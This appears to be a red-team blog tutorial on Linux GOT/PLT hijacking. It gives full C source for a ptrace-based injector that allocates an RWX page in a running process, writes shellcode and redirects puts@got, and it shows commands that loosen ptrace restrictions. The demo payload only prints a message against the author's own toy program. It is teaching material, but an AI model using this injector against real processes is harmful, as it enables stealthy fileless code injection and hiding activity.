---
title:  "Linux hacking part 11: GOT/PLT hijacking. Simple C example."
date:   2026-06-17 02:00:00 +0200
header:
  teaser: "/assets/images/206/2026-06-17_07-26.png"
categories:
  - linux
tags:
  - red team
  - linux
  - malware
  - injection
  - shellcode
  - elf
---

﷽

Hello, cybersecurity enthusiasts and white hackers!

![malware](/assets/images/206/2026-06-17_07-26.png){:class="img-responsive"}

This post is based on an exercise for my students and readers.     

In the [previous post](/linux/2026/03/12/linux-hacking-10.html) we explored shared library injection via `LD_PRELOAD`. Today we go one level deeper: instead of loading a new library, we surgically patch a pointer inside a running process to redirect one specific function call. No new files on disk, no `LD_PRELOAD`, just a few bytes overwritten at the right address.     

### concept

When a Linux binary calls an external function like `puts`, the call does not go directly to `libc`. Instead it passes through two structures baked into the ELF binary itself.     

*PLT - Procedure Linkage Table.* - a small table of stubs in the `.plt` section. Each stub is three instructions:

```nasm
puts@plt:
    jmp  QWORD PTR [rip + <offset>]   ; jump through the GOT
    push <n>                          ; PLT slot index
    jmp  plt[0]                       ; call the runtime resolver
```

*GOT - Global Offset Table.* - a writeable array of pointers in `.got.plt`. Before the first call to `puts`, the GOT entry points back into the PLT (to the `push` instruction above). On the *first* call the dynamic linker resolves the real libc address and writes it into the GOT. Every subsequent call skips the resolver and jumps straight to libc. This is called *lazy binding*.    

### practical example

The attack surface is obvious: the GOT is a writeable table of function pointers. If we overwrite the `puts` entry with our own address, every future call to `puts` in the victim will land in our code instead of `libc`.      

The technique in four steps:

attach to the victim with `ptrace` so we can read and write its memory.    
parse the victim's ELF binary to locate the `puts` entry in `.got.plt`.     
inject a `mmap` syscall into the victim to allocate a page of executable memory, then write our hook shellcode there.     
overwrite the GOT entry with the address of the shellcode and detach.     

Let's start from victim. The victim is intentionally minimal - it just announces its `PID` and prints `"meow"` in a loop so we can clearly see the moment the hook takes effect (`meow.c`):

```cpp
/*
 * meow.c
 * simple target process for GOT/PLT hijacking demo
 * author: @cocomelonc
 */
#include <stdio.h>
#include <unistd.h>

int main(void) {
  printf("victim pid: %d\n", getpid());
  while (1) {
    puts("meow");
    sleep(2);
  }
  return 0;
}
```

Now the interesting part. Let me walk through `hack.c` (our hijacker) section by section.     

First we need to *hook shellcode* - our hook replaces `puts` entirely. It calls `write(1, "[HOOKED] meow\n", 14)` directly via syscall (avoiding `libc`) and then returns to the caller. The string is appended at the end of the shellcode and addressed with a RIP-relative `lea`:     

```nasm
offset 0x00: mov rax, 1          ; SYS_write
offset 0x07: mov rdi, 1          ; fd = stdout
offset 0x0e: lea rsi, [rip+0x0a] ; buf (RIP after this instr = 0x15, 0x15+0x0a = 0x1f = msg)
offset 0x15: mov rdx, 14         ; len
offset 0x1c: syscall
offset 0x1e: ret
offset 0x1f: "[HOOKED] meow\n"   (14 bytes)
```

In C:

```cpp
static unsigned char hook_sc[] = {
  0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,     /* mov rax, 1            */
  0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,     /* mov rdi, 1            */
  0x48, 0x8d, 0x35, 0x0a, 0x00, 0x00, 0x00,     /* lea rsi, [rip+0x0a]   */
  0x48, 0xc7, 0xc2, 0x0e, 0x00, 0x00, 0x00,     /* mov rdx, 14           */
  0x0f, 0x05,                                   /* syscall               */
  0xc3,                                         /* ret                   */
  '[','H','O','O','K','E','D',']',' ','m','e','o','w','\n'
};
```

Next, *writing to victim memory* - we need a helper that writes an arbitrary byte buffer into the victim's address space in 8-byte chunks using `PTRACE_POKEDATA`. The last chunk (if the buffer is not a multiple of 8) uses a read-modify-write to avoid corrupting adjacent bytes:     

```cpp
static void poke_bytes(pid_t pid, uint64_t addr, void *data, size_t len) {
  size_t i;
  for (i = 0; i + 8 <= len; i += 8) {
    uint64_t word;
    memcpy(&word, (uint8_t *)data + i, 8);
    ptrace(PTRACE_POKEDATA, pid, addr + i, word);
  }
  if (i < len) {
    uint64_t word = ptrace(PTRACE_PEEKDATA, pid, addr + i, NULL);
    memcpy(&word, (uint8_t *)data + i, len - i);
    ptrace(PTRACE_POKEDATA, pid, addr + i, word);
  }
}
```

at the next step we need *syscall injection.* - we need to allocate a page of `PROT_READ|PROT_WRITE|PROT_EXEC` memory inside the victim. The trick: save the victim's registers and the current instruction at `RIP`, overwrite those two bytes with a `syscall` opcode (`0x0f 0x05`), set the registers to describe a `mmap` call, single-step one instruction, then read `RAX` for the returned address and restore everything:     

```cpp
static uint64_t inject_mmap(pid_t pid) {
  struct user_regs_struct regs, saved;
  uint64_t saved_instr;

  ptrace(PTRACE_GETREGS, pid, NULL, &saved);
  regs = saved;

  // save the 8 bytes at RIP and patch the first two to `syscall`
  saved_instr = ptrace(PTRACE_PEEKTEXT, pid, saved.rip, NULL);
  ptrace(PTRACE_POKETEXT, pid, saved.rip,
    (saved_instr & ~(uint64_t)0xffff) | 0x050f);

  // mmap(NULL, 4096, PROT_RWX, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
  regs.rax = 9;            /* SYS_mmap                  */
  regs.rdi = 0;            /* addr   = NULL             */
  regs.rsi = 4096;         /* length = 4096             */
  regs.rdx = 7;            /* PROT_READ|PROT_WRITE|PROT_EXEC */
  regs.r10 = 0x22;         /* MAP_PRIVATE|MAP_ANONYMOUS */
  regs.r8  = (uint64_t)-1; /* fd     = -1               */
  regs.r9  = 0;            /* offset = 0                */
  ptrace(PTRACE_SETREGS, pid, NULL, &regs);

  ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
  waitpid(pid, NULL, 0);

  ptrace(PTRACE_GETREGS, pid, NULL, &regs);
  uint64_t page = regs.rax;

  // restore original instruction and register state
  ptrace(PTRACE_POKETEXT, pid, saved.rip, saved_instr);
  ptrace(PTRACE_SETREGS, pid, NULL, &saved);

  return page;
}
```

after detaching the victim resumes exactly where it was, as if nothing happened - except there is now a new anonymous page in its address space containing our shellcode.

Next step. We need to *finding `puts@got`.* - we open `/proc/<pid>/exe` (the actual ELF on disk), read it into a buffer, then walk the section headers looking for `.rela.plt`, `.dynsym`, and `.dynstr`. Each entry in `.rela.plt` pairs a GOT slot address (`r_offset`) with a dynamic symbol index. We match the symbol name `"puts"` and return `r_offset`. For a `-no-pie` binary this is the absolute virtual address:    

```cpp
static uint64_t find_puts_got(pid_t pid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/exe", pid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) { perror("open exe"); return 0; }

  uint8_t *buf = NULL;
  size_t sz = 0;
  uint8_t tmp[4096];
  ssize_t n;
  while ((n = read(fd, tmp, sizeof(tmp))) > 0) {
    buf = realloc(buf, sz + n);
    memcpy(buf + sz, tmp, n);
    sz += n;
  }
  close(fd);

  Elf64_Ehdr *ehdr   = (Elf64_Ehdr *)buf;
  Elf64_Shdr *shdrs  = (Elf64_Shdr *)(buf + ehdr->e_shoff);
  char *shstrtab     = (char *)(buf + shdrs[ehdr->e_shstrndx].sh_offset);

  Elf64_Shdr *rela_plt = NULL, *dynsym_s = NULL, *dynstr_s = NULL;
  for (int i = 0; i < ehdr->e_shnum; i++) {
    char *name = shstrtab + shdrs[i].sh_name;
    if (!strcmp(name, ".rela.plt")) rela_plt = &shdrs[i];
    if (!strcmp(name, ".dynsym"))   dynsym_s  = &shdrs[i];
    if (!strcmp(name, ".dynstr"))   dynstr_s  = &shdrs[i];
  }

  if (!rela_plt || !dynsym_s || !dynstr_s) {
    fprintf(stderr, "required ELF sections not found\n");
    free(buf); return 0;
  }

  Elf64_Rela *relas  = (Elf64_Rela *)(buf + rela_plt->sh_offset);
  int         count  = rela_plt->sh_size / sizeof(Elf64_Rela);
  Elf64_Sym  *syms   = (Elf64_Sym  *)(buf + dynsym_s->sh_offset);
  char       *strtab = (char       *)(buf + dynstr_s->sh_offset);

  uint64_t addr = 0;
  for (int i = 0; i < count; i++) {
    uint32_t idx = ELF64_R_SYM(relas[i].r_info);
    if (!strcmp(strtab + syms[idx].st_name, "puts")) {
      addr = relas[i].r_offset;
      break;
    }
  }

  free(buf);
  return addr;
}
```

Finally, *`main` - putting it all together.* - attach, find the GOT entry, inject mmap, write shellcode, overwrite GOT, detach:    

```cpp
int main(int argc, char *argv[]) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s <pid>\n", argv[0]);
    return 1;
  }
  pid_t pid = (pid_t)atoi(argv[1]);

  printf("attaching to pid %d...\n", pid);
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
    perror("ptrace attach"); return 1;
  }
  waitpid(pid, NULL, 0);
  printf("attached\n");

  uint64_t got_puts = find_puts_got(pid);
  if (!got_puts) {
    fprintf(stderr, "puts@got not found\n");
    ptrace(PTRACE_DETACH, pid, NULL, NULL); return 1;
  }
  printf("puts@got: 0x%lx\n", got_puts);

  printf("injecting mmap syscall...\n");
  uint64_t page = inject_mmap(pid);
  if ((int64_t)page < 0) {
    fprintf(stderr, "mmap failed\n");
    ptrace(PTRACE_DETACH, pid, NULL, NULL); return 1;
  }
  printf("rwx page allocated: 0x%lx\n", page);

  printf("writing hook shellcode...\n");
  poke_bytes(pid, page, hook_sc, sizeof(hook_sc));
  printf("%zu bytes written\n", sizeof(hook_sc));

  printf("overwriting puts@got...\n");
  ptrace(PTRACE_POKEDATA, pid, got_puts, page);
  printf("puts@got -> 0x%lx\n", page);

  ptrace(PTRACE_DETACH, pid, NULL, NULL);
  printf("detached. victim is now hooked!\n");
  return 0;
}
```

So, full source code of `meow. c`:

```cpp
/*
 * meow.c
 * simple target process for GOT/PLT hijacking demo
 * author: @cocomelonc
 */
#include <stdio.h>
#include <unistd.h>

int main(void) {
  printf("victim pid: %d\n", getpid());
  while (1) {
    puts("meow");
    sleep(2);
  }
  return 0;
}
```

Full source code of `hack.c`:

```cpp
/*
 * hack.c
 * GOT/PLT hijacking: attaches to a running process via ptrace,
 * injects an rwx page, writes hook shellcode, overwrites puts@got
 * author: @cocomelonc
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <elf.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <stdint.h>

/*
 * hook shellcode: write(1, "[HOOKED] meow\n", 14) + ret
 * the string is appended at the end, addressed via rip-relative lea
 *
 * layout:
 *   0x00  mov rax, 1      (7 bytes)
 *   0x07  mov rdi, 1      (7 bytes)
 *   0x0e  lea rsi, [rip+0x0a] (7 bytes, RIP after = 0x15)
 *   0x15  mov rdx, 14     (7 bytes)
 *   0x1c  syscall        (2 bytes)
 *   0x1e  ret          (1 byte)
 *   0x1f  "[HOOKED] meow\n"   (14 bytes)
 */
static unsigned char hook_sc[] = {
  0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
  0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
  0x48, 0x8d, 0x35, 0x0a, 0x00, 0x00, 0x00,
  0x48, 0xc7, 0xc2, 0x0e, 0x00, 0x00, 0x00,
  0x0f, 0x05,
  0xc3,
  '[','H','O','O','K','E','D',']',' ','m','e','o','w','\n'
};

/* write len bytes of data into the tracee at addr, 8 bytes at a time */
static void poke_bytes(pid_t pid, uint64_t addr, void *data, size_t len) {
  size_t i;
  for (i = 0; i + 8 <= len; i += 8) {
    uint64_t word;
    memcpy(&word, (uint8_t *)data + i, 8);
    ptrace(PTRACE_POKEDATA, pid, addr + i, word);
  }
  if (i < len) {
    /* read-modify-write for the last partial chunk */
    uint64_t word = ptrace(PTRACE_PEEKDATA, pid, addr + i, NULL);
    memcpy(&word, (uint8_t *)data + i, len - i);
    ptrace(PTRACE_POKEDATA, pid, addr + i, word);
  }
}

/*
 * inject a mmap(NULL,4096,PROT_RWX,MAP_PRIVATE|MAP_ANON,-1,0) syscall
 * into the tracee by patching two bytes at RIP to 0f 05 (syscall),
 * single-stepping, then restoring registers and the original instruction
 */
static uint64_t inject_mmap(pid_t pid) {
  struct user_regs_struct regs, saved;
  uint64_t saved_instr;

  ptrace(PTRACE_GETREGS, pid, NULL, &saved);
  regs = saved;

  saved_instr = ptrace(PTRACE_PEEKTEXT, pid, saved.rip, NULL);
  ptrace(PTRACE_POKETEXT, pid, saved.rip,
       (saved_instr & ~(uint64_t)0xffff) | 0x050f);

  regs.rax = 9;
  regs.rdi = 0;
  regs.rsi = 4096;
  regs.rdx = 7;
  regs.r10 = 0x22;
  regs.r8  = (uint64_t)-1;
  regs.r9  = 0;
  ptrace(PTRACE_SETREGS, pid, NULL, &regs);

  ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
  waitpid(pid, NULL, 0);

  ptrace(PTRACE_GETREGS, pid, NULL, &regs);
  uint64_t page = regs.rax;

  ptrace(PTRACE_POKETEXT, pid, saved.rip, saved_instr);
  ptrace(PTRACE_SETREGS, pid, NULL, &saved);

  return page;
}

/* parse /proc/<pid>/exe and return the virtual address of puts@got */
static uint64_t find_puts_got(pid_t pid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/exe", pid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) { perror("open exe"); return 0; }

  uint8_t *buf = NULL;
  size_t sz = 0;
  uint8_t tmp[4096];
  ssize_t n;
  while ((n = read(fd, tmp, sizeof(tmp))) > 0) {
    buf = realloc(buf, sz + n);
    memcpy(buf + sz, tmp, n);
    sz += n;
  }
  close(fd);

  Elf64_Ehdr *ehdr   = (Elf64_Ehdr *)buf;
  Elf64_Shdr *shdrs  = (Elf64_Shdr *)(buf + ehdr->e_shoff);
  char *shstrtab   = (char *)(buf + shdrs[ehdr->e_shstrndx].sh_offset);

  Elf64_Shdr *rela_plt = NULL, *dynsym_s = NULL, *dynstr_s = NULL;
  for (int i = 0; i < ehdr->e_shnum; i++) {
    char *name = shstrtab + shdrs[i].sh_name;
    if (!strcmp(name, ".rela.plt")) rela_plt = &shdrs[i];
    if (!strcmp(name, ".dynsym"))   dynsym_s  = &shdrs[i];
    if (!strcmp(name, ".dynstr"))   dynstr_s  = &shdrs[i];
  }

  if (!rela_plt || !dynsym_s || !dynstr_s) {
    fprintf(stderr, "required ELF sections not found\n");
    free(buf); return 0;
  }

  Elf64_Rela *relas  = (Elf64_Rela *)(buf + rela_plt->sh_offset);
  int     count  = rela_plt->sh_size / sizeof(Elf64_Rela);
  Elf64_Sym  *syms   = (Elf64_Sym  *)(buf + dynsym_s->sh_offset);
  char     *strtab = (char     *)(buf + dynstr_s->sh_offset);

  uint64_t addr = 0;
  for (int i = 0; i < count; i++) {
    uint32_t idx = ELF64_R_SYM(relas[i].r_info);
    if (!strcmp(strtab + syms[idx].st_name, "puts")) {
      addr = relas[i].r_offset;
      break;
    }
  }

  free(buf);
  return addr;
}

int main(int argc, char *argv[]) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s <pid>\n", argv[0]);
    return 1;
  }
  pid_t pid = (pid_t)atoi(argv[1]);

  printf("attaching to pid %d...\n", pid);
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
    perror("ptrace attach"); return 1;
  }
  waitpid(pid, NULL, 0);
  printf("attached\n");

  uint64_t got_puts = find_puts_got(pid);
  if (!got_puts) {
    fprintf(stderr, "puts@got not found\n");
    ptrace(PTRACE_DETACH, pid, NULL, NULL); return 1;
  }
  printf("puts@got: 0x%lx\n", got_puts);

  printf("injecting mmap syscall...\n");
  uint64_t page = inject_mmap(pid);
  if ((int64_t)page < 0) {
    fprintf(stderr, "mmap failed\n");
    ptrace(PTRACE_DETACH, pid, NULL, NULL); return 1;
  }
  printf("rwx page allocated: 0x%lx\n", page);

  printf("writing hook shellcode...\n");
  poke_bytes(pid, page, hook_sc, sizeof(hook_sc));
  printf("%zu bytes written\n", sizeof(hook_sc));

  printf("overwriting puts@got...\n");
  ptrace(PTRACE_POKEDATA, pid, got_puts, page);
  printf("puts@got -> 0x%lx\n", page);

  ptrace(PTRACE_DETACH, pid, NULL, NULL);
  printf("detached. victim is now hooked!\n");
  return 0;
}
```

### demo

First, compile the victim with `-no-pie` (fixed addresses make the GOT entry address absolute, exactly what `.rela.plt` stores) and `-z norelro` (keeps the GOT writable):

```bash
gcc -no-pie -z norelro -o meow meow.c
```

![malware](/assets/images/206/2026-06-17_07-23.png){:class="img-responsive"}    

Run it in a first terminal and note the PID it prints:

```bash
./meow
```

![malware](/assets/images/206/2026-06-17_07-24_1.png){:class="img-responsive"}    

Compile the hijacker:

```bash
gcc -o hack hack.c
```

![malware](/assets/images/206/2026-06-17_07-24.png){:class="img-responsive"}    

On some systems ptrace across unrelated processes requires either root or relaxing the Yama LSM scope:

```bash
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

![malware](/assets/images/206/2026-06-17_07-23_1.png){:class="img-responsive"}    

Now run the hijacker in a second terminal, passing the victim's PID:

```bash
./hack <pid>
```

![malware](/assets/images/206/2026-06-17_07-27.png){:class="img-responsive"}    

Switch back to the first terminal. The victim is still running, the loop was never interrupted, but every `puts("meow")` now calls our hook shellcode:

![malware](/assets/images/206/2026-06-17_07-25.png){:class="img-responsive"}    

We can also confirm the GOT was overwritten before and after using `gdb` or `readelf`:

```bash
# before: shows the libc puts address
readelf -r meow | grep puts
```

![malware](/assets/images/206/2026-06-17_07-30.png){:class="img-responsive"}    

```bash
# at runtime, inspect the live GOT entry
cat /proc/<pid>/maps | grep rwxp
```

![malware](/assets/images/206/2026-06-17_07-35.png){:class="img-responsive"}    

It works perfectly!

### why this matters

This technique is a foundational primitive in Linux offensive tooling. It requires no file on disk (the shellcode lives in anonymous memory), leaves a minimal footprint, and survives as long as the target process is running. Real-world malware families such as [Winnti](https://malpedia.caad.fkie.fraunhofer.de/details/elf.winnti) abuse similar in-memory patching approaches to intercept calls and hide activity.

From a defensive perspective, GOT integrity can be monitored with tools that compare the runtime GOT entries against the expected libc addresses.

I hope this post with practical examples is useful for malware researchers, linux programmers and everyone who is interested in linux hacking techniques.

[Linux hacking part 10: Shared library injection and hijacking. Simple C examples](/linux/2026/03/12/linux-hacking-10.html)
[Linux malware development 3: linux process injection with ptrace. Simple C example](/linux/2024/11/22/linux-hacking-3.html)
[Winnti](https://malpedia.caad.fkie.fraunhofer.de/details/elf.winnti)
[source code in github](https://github.com/cocomelonc/meow/tree/master/2026-06-17-linux-hacking-11)

> This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!
*PS. All drawings and screenshots are mine*
